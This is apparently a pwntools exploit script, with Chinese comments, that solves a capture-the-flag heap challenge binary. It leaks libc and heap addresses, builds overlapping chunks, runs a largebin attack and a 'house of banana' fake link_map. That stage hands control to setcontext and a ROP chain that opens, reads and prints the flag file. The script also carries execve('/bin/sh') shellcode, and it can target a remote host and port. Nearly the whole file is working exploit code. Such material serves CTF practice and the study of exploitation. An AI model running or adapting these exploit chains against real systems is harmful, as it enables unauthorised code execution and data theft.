#!/usr/bin/python3
# -*- coding:utf-8 -*-
from pwn import *
import sys
import platform

'''
	待修改数据
'''
context.log_level = 'debug'
context.arch = 'amd64'				# 32位使用i386
context.os = 'linux'

execve_file = './ty_peak_last'
lib_file = './libc.so.6'


'''
	使用lambda函数包装pwntools的API，从而使与用户交互的都是str即可
'''
ENCODING = 'ISO-8859-1'
se	= lambda senddata						: r.send(senddata.encode(ENCODING))
sa	= lambda recvdata, senddata					: r.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl	= lambda senddata						: r.sendline(senddata.encode(ENCODING))
sla	= lambda recvdata, senddata					: r.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
re	= lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f			: (r.recv(numb, timeout=timeout).decode(ENCODING))
ru	= lambda recvdata, timeout=0x3f3f3f3f				: (r.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING))
uu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="unsigned")
uu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="unsigned")
iu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="signed")
iu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="signed")
up32	= lambda data							: (p32(data, signed="unsigned").decode(ENCODING))
up64	= lambda data							: (p64(data, signed="unsigned").decode(ENCODING))
ip32	= lambda data							: (p32(data, signed="signed").decode(ENCODING))
ip64	= lambda data							: (p64(data, signed="signed").decode(ENCODING))







'''
	elf.plt[`symbol`] 获取elf文件中导入符号的plt地址
	elf.got[`symbol`] 获取elf文件中导入符号的got地址
	elf.sym['symbol'] 获取elf文件中本地符号的函数实际地址
'''
if execve_file != None:
	elf = ELF(execve_file)

'''
	lib.sym[`symbol`] 获取lib中符号地址
	next(lib.search('string')) 获取lib中字符串地址
'''
if lib_file != None:
	lib = ELF(lib_file)






'''
	执行爆破攻击
	只有当成功获取shell或者键盘Ctrl+C退出时，程序中止循环
	否则程序一直进行循环
'''
def wp_add(size, message):
	sla('>> \n', '1')
	sla('Size: ', str(size))
	sa('Message: ', message)


def wp_delete(idx):
	sla('>> \n', '2')
	sla('Index: ', str(idx))

def wp_view(idx):
	sla('>> \n', '3')
	sla('Index: ', str(idx))

def wp_edit(idx, code):
	sla('>> \n', '4')
	sla('Index: ', str(idx))
	sa('Code :', code)

def wp_gift(idx, code):
	sla('>> \n', '5')
	sla('Index: ', str(idx))
	sa('Code :', code)

def exp():
	global r
	if 'd' in sys.argv:
		#r = process(execve_file, env = {'LD_LIBRARY_PATH':'./'})	# 首先加载当前目录下的动态库文件
		r = process(execve_file)
		#gdb.attach(r)	# 断点必须在第一个输入之后
		#r = gdb.debug(execve_file)
	else:
		r = remote(sys.argv[1], sys.argv[2])

	'''
	se	= lambda senddata						: r.send(senddata.encode(ENCODING))
	sa	= lambda recvdata, senddata					: r.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
	sl	= lambda senddata						: r.sendline(senddata.encode(ENCODING))
	sla	= lambda recvdata, senddata					: r.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
	re	= lambda numb = 0x3f3f3f3f, timeout = 0x3f3f3f3f		: ((r.recv(numb), timeout=timeout).decode(ENCODING))
	ru	= lambda recvdata, timeout = 0x3f3f3f3f				: ((r.recvuntil(recvdata.encode(ENCODING)), timeout=timeout).decode(ENCODING))
	uu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="unsigned")
	uu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="unsigned")
	iu32	= lambda data							: u32((data.ljust(4, '\x00')).encode(ENCODING), signed="signed")
	iu64	= lambda data							: u64((data.ljust(8, '\x00')).encode(ENCODING), signed="signed")
	up32	= lambda data							: (p32(data, signed="unsigned").decode(ENCODING))
	up64	= lambda data							: (p64(data, signed="unsigned").decode(ENCODING))
	ip32	= lambda data							: (p32(data, signed="signed").decode(ENCODING))
	ip64	= lambda data							: (p64(data, signed="signed").decode(ENCODING))
	'''

	'''
		这里给出asm 汇编->机器代码的相关样例
	'''
	if context.arch == 'amd64':
		shellcode = asm('''
	mov	rax, %d		/*rbx = "/bin/sh"*/
	push	rax
	mov	rdi, rsp	/*rdi -> "/bin/sh"*/
	xor	esi, esi	/*esi -> NULL*/
	xor	edx, edx	/*edx -> NULL*/
	push	0x3b
	pop	rax		/*rax = 0x3b*/
	syscall			/*execve("/bin/sh")*/ 
	label1:
	mov	rax, [rsp + %d]	/* 测试内存访问 */
	cmp	rax, 1
	je	label1		/* 测试近跳	*/
	'''%(u64('/bin/sh'.ljust(8, '\x00').encode(ENCODING)), 1)).decode(ENCODING)
	elif context.arch == 'i386':
		shellcode = asm('''
	push	%d		/*"/bin"*/
	push	%d		/*"/sh\x00"*/
	mov	ebx, esp	/*ebx -> "/bin/sh"*/
	xor	ecx, ecx	/*ecx -> NULL*/
	xor	edx, edx	/*edx -> NULL*/
	push	11
	pop	eax		/*eax = 11*/
	int 0x80		/*execve("/bin/sh")*/
	
	label1:
	mov	eax, [esp + %d]	/* 测试内存访问 */
	cmp	eax, 1
	je	label1		/* 测试近跳	*/
	'''%(u32('/sh'.encode(ENCODING)), u32('/bin'.encode(ENCODING)), 1)).decode(ENCODING)
	
	
	#获取chunk地址和libc地址
	wp_add(0x428, 'a')	#0
	wp_add(0x428, 'a')	#1
	wp_delete(0)
	wp_add(0x438, 'a')			#0
	wp_add(0x428, 'a' * 0x7)		#2
	wp_edit(2, '(' * 6 + '!(!(' + '(' * 6 + '!(!\x00')
	wp_view(2)
	ru('a' * 6 + '\x01\x01')
	lib_base = uu64(re(8)[:-2]) - 0x7fdd1f358fd0 + 0x7fdd1f16d000
	chunk_base = uu64(re(6)) - 0x000055e69bf0a2b0 + 0x55e69bf0a000
	log.info('lib_base => %#x'%(lib_base))
	log.info('chunk_base => %#x'%(chunk_base))
	wp_delete(0)
	wp_delete(1)
	wp_delete(2)


	#构建重叠chunk
	wp_add(0x408, 'a' * 0x408)	#0
	wp_add(0x428, 'a')		#1
	wp_add(0x468, 'a')		#2
	wp_add(0x408, 'a')		#3
	wp_add(0x458, 'a')		#4
	wp_add(0x408, up64(0) + up64(0x21) + up64(0) * 2 + up64(0) + up64(0x21))	#3

	fake_size = 0x430 + 0x470 + 0x410 + 0x460 + 0x10
	wp_gift(0, '[>]>,>,\x00')
	se(chr((fake_size & 0xff) + 1) + chr((fake_size >> 8) & 0xff))
	wp_delete(1)
	wp_add(fake_size - 0x8, 'a')	#1


	#largebin 攻击
	wp_delete(2)
	wp_add(0x490, 'a')		#2
	rtld_global = lib_base + 0x7efece6cf060 - 0x7efece499000
	log.info('rtld_global => %#x'%(rtld_global))
	wp_delete(1)
	wp_add(fake_size - 0x8, 'a' * 0x420 + up64(0) + up64(0x471) + up64(lib_base + 0x10 + lib.sym['__malloc_hook'] + 1120) + up64(lib_base + 0x10 + lib.sym['__malloc_hook'] + 1120) + up64(0) + up64(rtld_global - 0x20) + '\x00')				#1
	wp_delete(4)
	wp_add(0x490, 'a')		#4
	

	#house of banana
	fake_link_map_addr = chunk_base + 0x000055de23bed370 - 0x55de23bec000
	flag_address = fake_link_map_addr + 100 * 8
	stack_address = fake_link_map_addr + 0x10
	pop_rdi_ret = lib_base + 0x26b72
	ret = pop_rdi_ret + 1
	pop_rsi_ret = lib_base + 0x27529
	pop_rdx_r12_ret = lib_base + 0x11c36f
	syscall_ret = lib_base + 0x66229
	rop = ''
	rop += up64(pop_rdi_ret) + up64(flag_address)
	rop += up64(pop_rsi_ret) + up64(4)
	rop += up64(lib_base + lib.sym['open'])
	rop += up64(pop_rdi_ret) + up64(3)
	rop += up64(pop_rsi_ret) + up64(flag_address)
	rop += up64(pop_rdx_r12_ret) + up64(14 * 8) + up64(0)
	rop += up64(lib_base + lib.sym['read'])
	rop += up64(pop_rdi_ret) + up64(1)
	rop += up64(pop_rsi_ret) + up64(flag_address)
	rop += up64(pop_rdx_r12_ret) + up64(14 * 8) + up64(0)
	rop += up64(lib_base + lib.sym['write'])
	rop += up64(lib_base + lib.sym['exit'])
	'''
	link_map {
		l_addr = 0							offset: 0 * 8

		l_next = (char*)fake_link_map_addr + 7 * 8 - 3 * 8		offset: 3 * 8

		l_real = &link_map						offset: 5 * 8

		fake_l_next_2:							offset: 7 * 8
			(char*)fake_link_map_addr + 8 * 8 - 3 * 8
		fake_l_next_3:							offset: 8 * 8
			(char*)fake_link_map_addr + 13 * 8 - 3 * 8
		fake_l_real_2:							offset: 9 * 8
			(char*)fake_link_map_addr + 7 * 8 - 3 * 8
		fake_l_real_3:							offset: 10 * 8
			(char*)fake_link_map_addr + 8 * 8 - 3 * 8

		fake_l_next_4:							offset: 13 * 8
			null

		fake_l_real_4:							offset: 15 * 8
			(char*)fake_link_map_addr + 13 * 8 - 3 * 8

		l_info[26]							offset: 34 * 8
			(char*)&link_map + 50 * 8

		l_info[28]							offset: 36 * 8
			(char*)&link_map + 37 * 8

		fini_arraysize:							offset: 38 * 8
			8 * 2
	
		fini_array_un:							offset: 50 * 8
			0x1a
			(char*)&link_map + 52 * 8
		fini_array:							offset: 52 * 8
			lib_base + lib.sym['system']
			lib_base + ret
		
		setcontext_rdi:							offset: 66 * 8
			0
		setcontext_rsi:							offset: 67 * 8
			stack_address

		setcontext_rdx:							offset: 70 * 8
			len(rop)

		setcontext_stack:						offset: 73 * 8
			stack_address
		setcontext_retn:						offset: 74 * 8
			lib_base + lib.sym['read']
			
		
		l_init_called = 0x800000000					offset: 99 * 8
		flag:							offset: 100 * 8
			'flag\x00'
	}
	'''
	fake_link_map = ''
	fake_link_map = fake_link_map.ljust(3 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 7 * 8 - 3 * 8)			#l_next
	fake_link_map = fake_link_map.ljust(5 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr)					#l_real
	fake_link_map = fake_link_map.ljust(7 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 8 * 8 - 3 * 8)			#fake_l_next_2
	fake_link_map += up64(fake_link_map_addr + 13 * 8 - 3 * 8)			#fake_l_next_3
	fake_link_map += up64(fake_link_map_addr + 7 * 8 - 3 * 8)			#fake_l_real_2
	fake_link_map += up64(fake_link_map_addr + 8 * 8 - 3 * 8)			#fake_l_real_3
	fake_link_map = fake_link_map.ljust(13 * 8, '\x00')
	fake_link_map += up64(0)							#fake_l_next_4
	fake_link_map = fake_link_map.ljust(15 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 13 * 8 - 3 * 8)			#fake_l_real_4
	fake_link_map = fake_link_map.ljust(34 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 50 * 8)				#l_info[26]
	fake_link_map = fake_link_map.ljust(36 * 8, '\x00')
	fake_link_map += up64(fake_link_map_addr + 37 * 8)				#l_info[26]
	fake_link_map = fake_link_map.ljust(38 * 8, '\x00')
	fake_link_map += up64(8 * 2)							#fini_arraysize
	fake_link_map = fake_link_map.ljust(50 * 8, '\x00')
	fake_link_map += up64(0x1a) + up64(fake_link_map_addr + 52 * 8)			#fini_array_un
	fake_link_map += up64(lib_base + lib.sym['setcontext'] + 61) + up64(ret)	#fini_array
	fake_link_map = fake_link_map.ljust(66 * 8, '\x00')
	fake_link_map += up64(0)							#setcontext_rdi
	fake_link_map += up64(stack_address)						#setcontext_rsi
	fake_link_map = fake_link_map.ljust(70 * 8, '\x00')
	fake_link_map += up64(len(rop))							#setcontext_rdx
	fake_link_map = fake_link_map.ljust(73 * 8, '\x00')
	fake_link_map += up64(stack_address)						#setcontext_stack
	fake_link_map += up64(lib_base + lib.sym['read'])				#setcontext_retn
	fake_link_map = fake_link_map.ljust(99 * 8, '\x00')
	fake_link_map += up64(0x800000000)						#l_init_called
	fake_link_map += 'flag\x00'							#flag



	wp_delete(1)
	wp_add(fake_size - 0x8, 'a' * (0x420 + 0x470 + 0x410) + fake_link_map)	#1
	sla('>> \n', '6')


	se(rop)
	log.info(ru('}').split()[0])
exp()
